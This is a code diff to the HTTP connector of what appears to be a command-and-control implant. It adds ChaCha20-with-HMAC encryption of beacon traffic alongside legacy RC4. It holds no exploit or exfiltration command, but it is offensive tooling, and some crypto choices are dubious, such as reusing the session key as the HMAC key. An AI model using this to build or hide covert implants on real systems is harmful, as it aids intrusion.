@@ -134,6 +134,24 @@ BOOL ConnectorHTTP::SetProfile(void* profilePtr, BYTE* beat, ULONG beatSize)
 	this->proxy_username = (CHAR*)profile.proxy_username;
 	this->proxy_password = (CHAR*)profile.proxy_password;
 
+	// Set encryption method (default: RC4 for backward compatibility)
+	this->encryption_method = profile.encryption_method;
+
+	// Initialize ChaCha20 encryption support if needed
+	if (this->encryption_method == ENC_CHACHA20) {
+		// Use first 12 bytes of beat as nonce (each connection gets unique nonce)
+		if (beatSize >= 12) {
+			memcpy(this->chacha20_nonce, beat, 12);
+		} else {
+			// Fall back to using first beat bytes padded with index
+			if (beatSize > 0) {
+				memcpy(this->chacha20_nonce, beat, beatSize);
+			}
+			// Nonce already initialized to 0, this is acceptable for initial setup
+		}
+		// HMAC key will be initialized during Exchange() when sessionKey is available
+	}
+
 	if (this->proxy_type != PROXY_TYPE_NONE && profile.proxy_host != NULL) {
 		ULONG hostLen = StrLenA((CHAR*)profile.proxy_host);
 		WORD port = profile.proxy_port;
@@ -441,8 +459,40 @@ void ConnectorHTTP::RecvClear()
 void ConnectorHTTP::Exchange(BYTE* plainData, ULONG plainSize, BYTE* sessionKey)
 {
 	if (plainData && plainSize > 0) {
-		EncryptRC4(plainData, plainSize, sessionKey, 16);
-		this->SendData(plainData, plainSize);
+		// Encrypt request data based on configured encryption method
+		if (this->encryption_method == ENC_CHACHA20) {
+			// ChaCha20 + HMAC encryption
+			// Initialize HMAC key from session key (use same key like Go listener)
+			memcpy(this->chacha20_hmac_key, sessionKey, 32);
+
+			// Allocate output buffer for encrypted data with HMAC
+			// Output size: nonce(12) + plaintext + hmac(32)
+			ULONG encryptedSize = 12 + plainSize + 32;
+			BYTE* encryptedData = (BYTE*)this->functions->LocalAlloc(LPTR, encryptedSize);
+
+			// Generate random nonce for each message
+			for (int i = 0; i < 12; i++) {
+				encryptedData[i] = (BYTE)(GenerateRandom32() & 0xFF);
+			}
+			BYTE* msgNonce = encryptedData;
+
+			// Encrypt with HMAC
+			if (EncryptChaCha20WithHmac(plainData, plainSize,
+										sessionKey, 32,
+										msgNonce, 12,
+										this->chacha20_hmac_key, 32,
+										encryptedData, &encryptedSize) == 0) {
+				this->SendData(encryptedData, encryptedSize);
+			}
+
+			memset(encryptedData, 0, encryptedSize);
+			this->functions->LocalFree(encryptedData);
+		} else {
+			// RC4 encryption (legacy, for backward compatibility)
+			// sessionKey is 16 bytes for RC4
+			EncryptRC4(plainData, plainSize, sessionKey, 16);
+			this->SendData(plainData, plainSize);
+		}
 	}
 	else {
 		this->SendData(NULL, 0);
@@ -451,8 +501,31 @@ void ConnectorHTTP::Exchange(BYTE* plainData, ULONG plainSize, BYTE* sessionKey)
 	if (this->recvSize > 0 && this->recvData) {
 		int dataSize = this->RecvSize();
 		BYTE* dataPtr = this->RecvData();
-		if (dataSize > 0 && dataPtr)
-			DecryptRC4(dataPtr, dataSize, sessionKey, 16);
+		if (dataSize > 0 && dataPtr) {
+			// Decrypt response data based on configured encryption method
+			if (this->encryption_method == ENC_CHACHA20) {
+				// ChaCha20 + HMAC decryption
+				ULONG decryptedSize = dataSize;
+				BYTE* decryptedData = (BYTE*)this->functions->LocalAlloc(LPTR, decryptedSize);
+
+				// Decrypt with HMAC verification
+				if (DecryptChaCha20WithHmac(dataPtr, dataSize,
+											sessionKey, 32,
+											this->chacha20_hmac_key, 32,
+											decryptedData, &decryptedSize) == 0) {
+					// Copy decrypted data back
+					memcpy(dataPtr, decryptedData, decryptedSize);
+					this->recvSize = decryptedSize + this->ans_pre_size + this->ans_size;
+				}
+				// else: HMAC verification failed, keep original data for error handling
+
+				memset(decryptedData, 0, decryptedSize);
+				this->functions->LocalFree(decryptedData);
+			} else {
+				// RC4 decryption
+				DecryptRC4(dataPtr, dataSize, sessionKey, 16);
+			}
+		}
 	}
 }
 
